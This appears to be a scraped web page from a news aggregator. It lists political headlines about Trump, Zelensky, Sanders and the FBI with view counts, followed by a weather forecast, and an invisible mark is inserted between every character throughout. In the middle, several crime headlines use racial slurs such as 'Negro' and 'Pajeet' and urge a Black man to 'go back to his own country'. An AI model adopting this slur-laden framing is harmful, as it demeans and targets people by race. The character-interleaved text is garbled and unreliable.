J‚Äéa‚Äén‚Äée‚Äét‚Äé ‚ÄéY‚Äée‚Äél‚Äél‚Äée‚Äén‚Äé:‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚ÄéM‚Äéa‚Äén‚Äéu‚Äéf‚Äéa‚Äéc‚Äét‚Äéu‚Äér‚Äéi‚Äén‚Äég‚Äé ‚ÄéI‚Äés‚Äé ‚Äéa‚Äé ‚Äé‚Äò‚ÄéP‚Äéi‚Äép‚Äée‚Äé ‚ÄéD‚Äér‚Äée‚Äéa‚Äém‚Äé,‚Äé‚Äô‚Äé ‚ÄéM‚Äéa‚Äéy‚Äé ‚ÄéN‚Äéo‚Äét‚Äé ‚ÄéB‚Äée‚Äé ‚Äéa‚Äé ‚Äé‚Äò‚ÄéD‚Äée‚Äés‚Äéi‚Äér‚Äéa‚Äéb‚Äél‚Äée‚Äé ‚ÄéG‚Äé
Y‚Äée‚Äél‚Äél‚Äée‚Äén‚Äé:‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚ÄéM‚Äéa‚Äén‚Äéu‚Äéf‚Äéa‚Äéc‚Äét‚Äéu‚Äér‚Äéi‚Äén‚Äég‚Äé ‚ÄéI‚Äés‚Äé ‚Äéa‚Äé ‚Äé'‚ÄéP‚Äéi‚Äép‚Äée‚Äé ‚ÄéD‚Äér‚Äée‚Äéa‚Äém‚Äé'‚Äé
1‚Äé3‚Äé6‚Äé
S‚Äéu‚Äés‚Äép‚Äée‚Äéc‚Äét‚Äé ‚Äéi‚Äén‚Äé ‚Äéa‚Äér‚Äés‚Äéo‚Äén‚Äé ‚Äéa‚Äét‚Äé ‚ÄéP‚Äée‚Äén‚Äén‚Äés‚Äéy‚Äél‚Äév‚Äéa‚Äén‚Äéi‚Äéa‚Äé ‚ÄéG‚Äéo‚Äév‚Äé.‚Äé ‚ÄéJ‚Äéo‚Äés‚Äéh‚Äé ‚ÄéS‚Äéh‚Äéa‚Äép‚Äéi‚Äér‚Äéo‚Äé‚Äô‚Äés‚Äé ‚Äér‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äéc‚Äée‚Äé ‚Äép‚Äél‚Äéa‚Äén‚Äén‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äée‚Äéa‚Äét‚Äé ‚Äéh‚Äéi‚Äém‚Äé,‚Äé ‚Äéd‚Äéo‚Äéc‚Äéu‚Äém‚Äée‚Äén‚Äét‚Äés‚Äé
S‚Äéu‚Äés‚Äép‚Äée‚Äéc‚Äét‚Äé ‚Äéi‚Äén‚Äé ‚Äéa‚Äér‚Äés‚Äéo‚Äén‚Äé ‚Äéa‚Äét‚Äé ‚ÄéP‚Äée‚Äén‚Äén‚Äés‚Äéy‚Äél‚Äév‚Äéa‚Äén‚Äéi‚Äéa‚Äé ‚ÄéG‚Äéo‚Äév‚Äé.‚Äé ‚ÄéJ‚Äéo‚Äés‚Äéh‚Äé ‚ÄéS‚Äéh‚Äéa‚Äép‚Äéi‚Äér‚Äéo‚Äé‚Äô‚Äés‚Äé ‚Äér‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äéc‚Äée‚Äé ‚Äép‚Äél‚Äéa‚Äén‚Äén‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äée‚Äéa‚Äét‚Äé ‚Äéh‚Äéi‚Äém‚Äé,‚Äé ‚Äéd‚Äéo‚Äéc‚Äéu‚Äém‚Äée‚Äén‚Äét‚Äés‚Äé ‚Äés‚Äéa‚Äéy‚Äé
8‚Äé3‚Äé2‚Äé
‚Äò‚ÄéE‚Äév‚Äée‚Äér‚Äéy‚Äéb‚Äéo‚Äéd‚Äéy‚Äé ‚ÄéT‚Äéh‚Äéi‚Äén‚Äék‚Äés‚Äé ‚ÄéT‚Äéh‚Äée‚Äéy‚Äé ‚ÄéU‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéa‚Äén‚Äéd‚Äé‚Äô‚Äé:‚Äé ‚ÄéZ‚Äée‚Äél‚Äée‚Äén‚Äés‚Äék‚Äéy‚Äé ‚ÄéT‚Äée‚Äél‚Äél‚Äés‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéH‚Äée‚Äé ‚ÄéC‚Äéa‚Äén‚Äé‚Äô‚Äét‚Äé ‚ÄéC‚Äéo‚Äém‚Äép‚Äér‚Äée‚Äéh‚Äée‚Äén‚Äéd‚Äé ‚ÄéU‚Äék‚Äér‚Äéa‚Äé
Z‚Äée‚Äél‚Äée‚Äén‚Äés‚Äék‚Äéy‚Äé ‚ÄéT‚Äée‚Äél‚Äél‚Äés‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéH‚Äée‚Äé ‚ÄéC‚Äéa‚Äén‚Äé'‚Äét‚Äé ‚ÄéU‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéa‚Äén‚Äéd‚Äé ‚ÄéU‚Äék‚Äér‚Äéa‚Äéi‚Äén‚Äée‚Äé ‚ÄéU‚Äén‚Äét‚Äéi‚Äél‚Äé ‚ÄéH‚Äée‚Äé ‚ÄéV‚Äéi‚Äés‚Äéi‚Äét‚Äés‚Äé ‚ÄéC‚Äéo‚Äéu‚Äén‚Äét‚Äér‚Äéy‚Äé
2‚Äé,‚Äé4‚Äé6‚Äé7‚Äé
B‚Äée‚Äér‚Äén‚Äéi‚Äée‚Äé ‚ÄéS‚Äéa‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äé ‚ÄéC‚Äél‚Äéa‚Äéi‚Äém‚Äés‚Äé ‚ÄéH‚Äéi‚Äés‚Äé ‚ÄéS‚Äéu‚Äép‚Äép‚Äéo‚Äér‚Äét‚Äée‚Äér‚Äés‚Äé ‚ÄéM‚Äéa‚Äék‚Äéi‚Äén‚Äég‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéM‚Äéu‚Äés‚Äék‚Äé ‚Äé‚Äò‚ÄéV‚Äée‚Äér‚Äéy‚Äé ‚ÄéN‚Äée‚Äér‚Äév‚Äéo‚Äéu‚Äés‚Äé‚Äô‚Äé
B‚Äée‚Äér‚Äén‚Äéi‚Äée‚Äé ‚ÄéS‚Äéa‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äé ‚ÄéS‚Äéa‚Äéy‚Äés‚Äé ‚ÄéS‚Äéu‚Äép‚Äép‚Äéo‚Äér‚Äét‚Äée‚Äér‚Äés‚Äé ‚ÄéM‚Äéa‚Äék‚Äéi‚Äén‚Äég‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéM‚Äéu‚Äés‚Äék‚Äé ‚Äé'‚ÄéV‚Äée‚Äér‚Äéy‚Äé ‚ÄéN‚Äée‚Äér‚Äév‚Äéo‚Äéu‚Äés‚Äé'‚Äé
3‚Äé,‚Äé9‚Äé0‚Äé7‚Äé
F‚ÄéB‚ÄéI‚Äé:‚Äé ‚ÄéW‚Äéi‚Äés‚Äéc‚Äéo‚Äén‚Äés‚Äéi‚Äén‚Äé ‚ÄéT‚Äée‚Äée‚Äén‚Äé ‚ÄéM‚Äéu‚Äér‚Äéd‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéP‚Äéa‚Äér‚Äée‚Äén‚Äét‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äé‚Äò‚ÄéE‚Äéx‚Äét‚Äér‚Äée‚Äém‚Äéi‚Äés‚Äét‚Äé‚Äô‚Äé ‚ÄéP‚Äél‚Äéo‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚ÄéF‚Äéu‚Äén‚Äéd‚Äé ‚ÄéA‚Äés‚Äés‚Äéa‚Äés‚Äés‚Äéi‚Äén‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéP‚Äér‚Äée‚Äés‚Äéi‚Äé
F‚ÄéB‚ÄéI‚Äé:‚Äé ‚ÄéT‚Äée‚Äée‚Äén‚Äé ‚ÄéM‚Äéu‚Äér‚Äéd‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéP‚Äéa‚Äér‚Äée‚Äén‚Äét‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚ÄéP‚Äél‚Äéo‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚ÄéF‚Äéu‚Äén‚Äéd‚Äé ‚ÄéA‚Äés‚Äés‚Äéa‚Äés‚Äés‚Äéi‚Äén‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé
4‚Äé,‚Äé5‚Äé7‚Äé5‚Äé
F‚Äée‚Äéd‚Äée‚Äér‚Äéa‚Äél‚Äé ‚ÄéJ‚Äéu‚Äéd‚Äég‚Äée‚Äé ‚ÄéO‚Äér‚Äéd‚Äée‚Äér‚Äés‚Äé ‚ÄéU‚ÄéS‚ÄéD‚ÄéA‚Äé ‚Äét‚Äéo‚Äé ‚ÄéU‚Äén‚Äéf‚Äér‚Äée‚Äée‚Äéz‚Äée‚Äé ‚ÄéF‚Äéu‚Äén‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚ÄéM‚Äéa‚Äéi‚Äén‚Äée‚Äé ‚Äéa‚Äés‚Äé ‚ÄéT‚Äér‚Äéa‚Äén‚Äés‚Äé ‚ÄéA‚Äét‚Äéh‚Äél‚Äée‚Äét‚Äée‚Äés‚Äé ‚ÄéD‚Äéi‚Äés‚Äép‚Äéu‚Äét‚Äée‚Äé ‚ÄéC‚Äéo‚Äén‚Äét‚Äéi‚Äén‚Äéu‚Äée‚Äés‚Äé
F‚Äée‚Äéd‚Äée‚Äér‚Äéa‚Äél‚Äé ‚ÄéJ‚Äéu‚Äéd‚Äég‚Äée‚Äé ‚ÄéO‚Äér‚Äéd‚Äée‚Äér‚Äés‚Äé ‚ÄéU‚ÄéS‚ÄéD‚ÄéA‚Äé ‚Äét‚Äéo‚Äé ‚ÄéU‚Äén‚Äéf‚Äér‚Äée‚Äée‚Äéz‚Äée‚Äé ‚ÄéF‚Äéu‚Äén‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚ÄéM‚Äéa‚Äéi‚Äén‚Äée‚Äé
5‚Äé,‚Äé6‚Äé1‚Äé7‚Äé
D‚Äéo‚Äén‚Äéa‚Äél‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé‚Äô‚Äés‚Äé ‚ÄéE‚Äén‚Äét‚Äér‚Äéa‚Äén‚Äéc‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚ÄéS‚Äét‚Äéa‚Äér‚Äé-‚ÄéS‚Äét‚Äéu‚Äéd‚Äéd‚Äée‚Äéd‚Äé ‚ÄéU‚ÄéF‚ÄéC‚Äé ‚Äé3‚Äé1‚Äé4‚Äé ‚ÄéB‚Äér‚Äéi‚Äén‚Äég‚Äés‚Äé ‚ÄéH‚Äéo‚Äéu‚Äés‚Äée‚Äé ‚ÄéD‚Äéo‚Äéw‚Äén‚Äé
D‚Äéo‚Äén‚Äéa‚Äél‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé'‚Äés‚Äé ‚ÄéE‚Äén‚Äét‚Äér‚Äéa‚Äén‚Äéc‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚ÄéS‚Äét‚Äéa‚Äér‚Äé-‚ÄéS‚Äét‚Äéu‚Äéd‚Äéd‚Äée‚Äéd‚Äé ‚ÄéU‚ÄéF‚ÄéC‚Äé ‚Äé3‚Äé1‚Äé4‚Äé ‚ÄéB‚Äér‚Äéi‚Äén‚Äég‚Äés‚Äé ‚ÄéH‚Äéo‚Äéu‚Äés‚Äée‚Äé ‚ÄéD‚Äéo‚Äéw‚Äén‚Äé
5‚Äé,‚Äé6‚Äé9‚Äé9‚Äé
A‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äé ‚ÄéW‚Äéi‚Äén‚Äén‚Äéi‚Äén‚Äég‚Äé:‚Äé ‚ÄéN‚Äév‚Äéi‚Äéd‚Äéi‚Äéa‚Äé ‚Äét‚Äéo‚Äé ‚ÄéI‚Äén‚Äév‚Äée‚Äés‚Äét‚Äé ‚Äé$‚Äé5‚Äé0‚Äé0‚Äé ‚ÄéB‚Äéi‚Äél‚Äél‚Äéi‚Äéo‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚ÄéB‚Äéu‚Äéi‚Äél‚Äéd‚Äé ‚ÄéA‚ÄéI‚Äé ‚ÄéC‚Äéh‚Äéi‚Äép‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéS‚Äéu‚Äép‚Äée‚Äér‚Äéc‚Äéo‚Äém‚Äép‚Äéu‚Äét‚Äée‚Äér‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚ÄéT‚Äée‚Äéx‚Äéa‚Äés‚Äé
N‚Äév‚Äéi‚Äéd‚Äéi‚Äéa‚Äé ‚Äét‚Äéo‚Äé ‚ÄéI‚Äén‚Äév‚Äée‚Äés‚Äét‚Äé ‚Äé$‚Äé5‚Äé0‚Äé0‚Äé ‚ÄéB‚Äéi‚Äél‚Äél‚Äéi‚Äéo‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚ÄéB‚Äéu‚Äéi‚Äél‚Äéd‚Äé ‚ÄéA‚ÄéI‚Äé ‚ÄéC‚Äéh‚Äéi‚Äép‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéS‚Äéu‚Äép‚Äée‚Äér‚Äéc‚Äéo‚Äém‚Äép‚Äéu‚Äét‚Äée‚Äér‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚ÄéT‚Äée‚Äéx‚Äéa‚Äés‚Äé
3‚Äé,‚Äé0‚Äé9‚Äé6‚Äé
E‚Äéx‚Äéc‚Äél‚Äéu‚Äés‚Äéi‚Äév‚Äée‚Äé ‚Äé‚Äî‚Äé ‚ÄéG‚Äér‚Äée‚Äée‚Äéc‚Äée‚Äé‚Äô‚Äés‚Äé ‚ÄéV‚Äéi‚Äéc‚Äée‚Äé ‚ÄéP‚Äér‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äé ‚ÄéR‚Äéo‚Äéo‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äéi‚Äén‚Äé ‚ÄéT‚Äér‚Äéa‚Äéd‚Äée‚Äé ‚ÄéW‚Äéa‚Äér‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéC‚Äéh‚Äéi‚Äén‚Äéa‚Äé:‚Äé ‚Äé‚Äò‚ÄéT‚Äéh‚Äée‚Äé ‚ÄéW‚Äée‚Äés‚Äét‚Äé ‚Äé
E‚Äéx‚Äéc‚Äél‚Äéu‚Äés‚Äéi‚Äév‚Äée‚Äé ‚Äé‚Äî‚Äé ‚ÄéG‚Äér‚Äée‚Äée‚Äéc‚Äée‚Äé‚Äô‚Äés‚Äé ‚ÄéV‚ÄéP‚Äé ‚ÄéR‚Äéo‚Äéo‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äéi‚Äén‚Äé ‚ÄéT‚Äér‚Äéa‚Äéd‚Äée‚Äé ‚ÄéW‚Äéa‚Äér‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéC‚Äéh‚Äéi‚Äén‚Äéa‚Äé

N‚Äée‚Äég‚Äér‚Äéo‚Äé ‚ÄéB‚Äéu‚Äér‚Äén‚Äés‚Äé ‚ÄéP‚Äéa‚Äéj‚Äée‚Äée‚Äét‚Äé ‚ÄéS‚Äét‚Äéo‚Äér‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéW‚Äér‚Äéi‚Äét‚Äée‚Äés‚Äé ‚Äé""‚ÄéW‚Äéh‚Äéi‚Äét‚Äée‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äé""‚Äé,‚Äé ‚ÄéT‚Äée‚Äél‚Äél‚Äéi‚Äén‚Äég‚Äé ‚ÄéT‚Äéh‚Äée‚Äém‚Äé ‚Äét‚Äéo‚Äé ‚ÄéG‚Äéo‚Äé ‚ÄéB‚Äéa‚Äéc‚Äék‚Äé ‚Äét‚Äéo‚Äé ‚ÄéT‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚ÄéO‚Äéw‚Äén‚Äé ‚ÄéC‚Äéo‚Äéu‚Äén‚Äét‚Äér‚Äéy‚Äé.‚Äé

L‚Äée‚Äét‚Äé'‚Äés‚Äé ‚Äéh‚Äéo‚Äép‚Äée‚Äé ‚Äét‚Äéh‚Äéi‚Äés‚Äé ‚Äén‚Äée‚Äég‚Äér‚Äéo‚Äé ‚Äég‚Äéo‚Äée‚Äés‚Äé ‚Äéb‚Äéa‚Äéc‚Äék‚Äé ‚Äét‚Äéo‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äéo‚Äéw‚Äén‚Äé ‚Äéc‚Äéo‚Äéu‚Äén‚Äét‚Äér‚Äéy‚Äé.‚Äé


N‚Äée‚Äég‚Äér‚Äéo‚Äé ‚ÄéC‚Äéh‚Äéa‚Äér‚Äég‚Äée‚Äéd‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéM‚Äéa‚Äén‚Äés‚Äél‚Äéa‚Äéu‚Äég‚Äéh‚Äét‚Äée‚Äér‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äéi‚Äén‚Äég‚Äé ‚ÄéD‚Äéi‚Äéa‚Äép‚Äée‚Äér‚Äé ‚ÄéT‚Äéh‚Äéi‚Äée‚Äéf‚Äé ‚ÄéI‚Äén‚Äés‚Äéi‚Äéd‚Äée‚Äé ‚ÄéF‚Äél‚Äéo‚Äér‚Äéi‚Äéd‚Äéa‚Äé ‚ÄéW‚Äéa‚Äél‚Äém‚Äéa‚Äér‚Äét‚Äé.‚Äé


2‚Äé ‚ÄéH‚Äéa‚Äém‚Äém‚Äée‚Äér‚Äéi‚Äén‚Äé'‚Äé ‚ÄéS‚Äéi‚Äém‚Äéi‚Äéa‚Äén‚Äés‚Äé ‚ÄéA‚Äét‚Äét‚Äéa‚Äéc‚Äék‚Äé ‚ÄéW‚Äéh‚Äéi‚Äét‚Äée‚Äé ‚ÄéM‚Äéa‚Äén‚Äé ‚Äéo‚Äén‚Äé ‚ÄéM‚Äéa‚Äén‚Äéh‚Äéa‚Äét‚Äét‚Äéa‚Äén‚Äé ‚ÄéT‚Äér‚Äéa‚Äéi‚Äén‚Äé.‚Äé


N‚Äée‚Äég‚Äér‚Äéo‚Äé ‚ÄéR‚Äéa‚Äél‚Äép‚Äéh‚Äé ‚ÄéL‚Äéa‚Äéu‚Äér‚Äée‚Äén‚Äé ‚ÄéE‚Äém‚Äép‚Äél‚Äéo‚Äéy‚Äée‚Äée‚Äé ‚ÄéM‚Äéa‚Äék‚Äée‚Äés‚Äé ‚Äé$‚Äé5‚Äé0‚ÄéK‚Äé ‚ÄéS‚Äée‚Äél‚Äél‚Äéi‚Äén‚Äég‚Äé ‚ÄéS‚Äét‚Äéo‚Äél‚Äée‚Äén‚Äé ‚ÄéI‚Äét‚Äée‚Äém‚Äés‚Äé.‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéW‚Äée‚Äéa‚Äét‚Äéh‚Äée‚Äér‚Äé.‚Äé

M‚Äéo‚Äén‚Äé ‚Äé1‚Äé4‚Äé ‚Äé|‚Äé ‚ÄéN‚Äéi‚Äég‚Äéh‚Äét‚Äé
6‚Äé3‚Äé¬∞‚Äé
1‚Äé6‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé ‚Äés‚Äék‚Äéi‚Äée‚Äés‚Äé ‚Äét‚Äéh‚Äéi‚Äés‚Äé ‚Äée‚Äév‚Äée‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äéw‚Äéi‚Äél‚Äél‚Äé ‚Äéb‚Äée‚Äéc‚Äéo‚Äém‚Äée‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äéc‚Äéa‚Äés‚Äét‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äén‚Äéi‚Äég‚Äéh‚Äét‚Äé.‚Äé ‚ÄéL‚Äéo‚Äéw‚Äé ‚Äé6‚Äé3‚ÄéF‚Äé.‚Äé ‚ÄéS‚ÄéS‚ÄéE‚Äé ‚Äéw‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚Äés‚Äéh‚Äéi‚Äéf‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚ÄéN‚ÄéN‚ÄéE‚Äé ‚Äéa‚Äét‚Äé ‚Äé1‚Äé0‚Äé ‚Äét‚Äéo‚Äé ‚Äé1‚Äé5‚Äé ‚Äém‚Äép‚Äéh‚Äé.‚Äé

H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
6‚Äé6‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
0‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
M‚Äéo‚Äéo‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
9‚Äé:‚Äé4‚Äé6‚Äé ‚Äép‚Äém‚Äé
W‚Äéa‚Äén‚Äéi‚Äén‚Äég‚Äé ‚ÄéG‚Äéi‚Äéb‚Äéb‚Äéo‚Äéu‚Äés‚Äé
M‚Äéo‚Äéo‚Äén‚Äés‚Äée‚Äét‚Äé
7‚Äé:‚Äé4‚Äé3‚Äé ‚Äéa‚Äém‚Äé
T‚Äéu‚Äée‚Äé ‚Äé1‚Äé5‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé4‚Äé¬∞‚Äé
/‚Äé6‚Äé1‚Äé¬∞‚Äé
1‚Äé0‚Äé%‚Äé
 ‚ÄéN‚ÄéE‚Äé ‚Äé1‚Äé4‚Äé ‚Äém‚Äép‚Äéh‚Äé
W‚Äée‚Äéd‚Äé ‚Äé1‚Äé6‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé6‚Äé¬∞‚Äé
/‚Äé6‚Äé4‚Äé¬∞‚Äé
2‚Äé0‚Äé%‚Äé
 ‚ÄéS‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé5‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé1‚Äé7‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé8‚Äé¬∞‚Äé
/‚Äé6‚Äé8‚Äé¬∞‚Äé
8‚Äé%‚Äé
 ‚ÄéS‚Äé ‚Äé2‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé1‚Äé8‚Äé
C‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé9‚Äé¬∞‚Äé
/‚Äé6‚Äé9‚Äé¬∞‚Äé
1‚Äé4‚Äé%‚Äé
 ‚ÄéS‚Äé ‚Äé2‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé1‚Äé9‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé6‚Äé¬∞‚Äé
/‚Äé6‚Äé9‚Äé¬∞‚Äé
4‚Äé5‚Äé%‚Äé
 ‚ÄéS‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé8‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé2‚Äé0‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé2‚Äé¬∞‚Äé
/‚Äé6‚Äé2‚Äé¬∞‚Äé
4‚Äé0‚Äé%‚Äé
 ‚ÄéS‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé2‚Äé1‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéS‚Äéu‚Äén‚Äén‚Äéy‚Äé
9‚Äé2‚Äé¬∞‚Äé
/‚Äé6‚Äé8‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
 ‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéu‚Äée‚Äé ‚Äé2‚Äé2‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
9‚Äé0‚Äé¬∞‚Äé
/‚Äé6‚Äé6‚Äé¬∞‚Äé
3‚Äé5‚Äé%‚Äé
 ‚ÄéS‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
W‚Äée‚Äéd‚Äé ‚Äé2‚Äé3‚Äé
A‚ÄéM‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äés‚Äé/‚ÄéP‚ÄéM‚Äé ‚ÄéS‚Äéu‚Äén‚Äé
8‚Äé8‚Äé¬∞‚Äé
/‚Äé6‚Äé8‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
 ‚ÄéS‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé2‚Äé4‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé5‚Äé¬∞‚Äé
/‚Äé6‚Äé4‚Äé¬∞‚Äé
5‚Äé7‚Äé%‚Äé
 ‚ÄéE‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé2‚Äé5‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé2‚Äé¬∞‚Äé
/‚Äé6‚Äé7‚Äé¬∞‚Äé
4‚Äé0‚Äé%‚Äé
 ‚ÄéE‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé2‚Äé6‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé4‚Äé¬∞‚Äé
/‚Äé6‚Äé7‚Äé¬∞‚Äé
5‚Äé3‚Äé%‚Äé
 ‚ÄéE‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé2‚Äé7‚Äé
A‚ÄéM‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé5‚Äé¬∞‚Äé
/‚Äé6‚Äé6‚Äé¬∞‚Äé
4‚Äé0‚Äé%‚Äé
 ‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé2‚Äé8‚Äé
